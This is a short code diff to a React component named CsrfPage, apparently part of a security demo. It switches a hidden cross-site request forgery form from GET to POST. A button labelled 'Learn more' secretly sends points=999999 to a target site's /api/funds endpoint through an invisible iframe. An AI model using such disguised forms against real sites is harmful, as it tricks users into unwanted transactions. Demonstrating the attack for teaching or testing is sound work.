@@ -15,7 +15,7 @@ class CsrfPage extends React.Component {
                 <div className={s.iphone_big}>
                     <iframe className={s.hidden} name="iframeHidden"/>
                     <div className={s.iphone_big_btn1}>
-                        <form method="GET" action={`http://${target}/api/funds`} target="iframeHidden">
+                        <form method="POST" action={`http://${target}/api/funds`} target="iframeHidden">
                             <input type="hidden" name="points" value="999999"/>
                             <input type="submit" className="span4 btn btn-primary" value={"進一步了解"} onClick={this.onClick}/>
                          </form>
